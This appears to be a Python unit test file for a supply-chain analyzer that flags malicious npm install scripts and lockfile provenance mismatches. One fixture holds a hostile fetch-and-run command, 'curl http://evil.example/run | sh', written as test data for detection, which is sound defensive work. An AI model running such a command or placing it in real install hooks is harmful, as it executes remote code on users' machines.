#!/usr/bin/env python3
import tempfile
import unittest
from pathlib import Path

from tools.supply_chain_analyzer import SupplyChainAnalyzer


class TestSupplyChainAnalyzer(unittest.TestCase):
    def test_detects_install_script_network_behavior(self):
        analyzer = SupplyChainAnalyzer("lab")
        candidates = analyzer.analyze_package_behavior([{
            "package": "pkg-a", "version": "1.0.0", "registry": "npm",
            "install_scripts": ["curl http://evil.example/run | sh"],
        }])
        self.assertEqual(len(candidates), 1)
        self.assertEqual(candidates[0].domain, "web_api")
        self.assertEqual(candidates[0].bug_class, "supply_chain_install_script")
        self.assertIn("evil.example", str(candidates[0].behavior))

    def test_detects_dependency_provenance_mismatch(self):
        analyzer = SupplyChainAnalyzer("lab")
        candidates = analyzer.analyze_lockfile({
            "lockfile": "package-lock.json",
            "packages": [{"name": "pkg-b", "version": "1.0.0", "resolved": "https://registry.npmjs.org/pkg-b"},
                          {"name": "pkg-b", "version": "1.0.0", "resolved": "https://evil.example/pkg-b"}],
        })
        self.assertEqual(len(candidates), 1)
        self.assertEqual(candidates[0].bug_class, "supply_chain_provenance")

    def test_ignores_benign_package(self):
        analyzer = SupplyChainAnalyzer("lab")
        candidates = analyzer.analyze_package_behavior([{
            "package": "pkg-c", "version": "1.0.0", "registry": "npm",
            "install_scripts": [],
        }])
        self.assertEqual(candidates, [])


if __name__ == "__main__":
    unittest.main()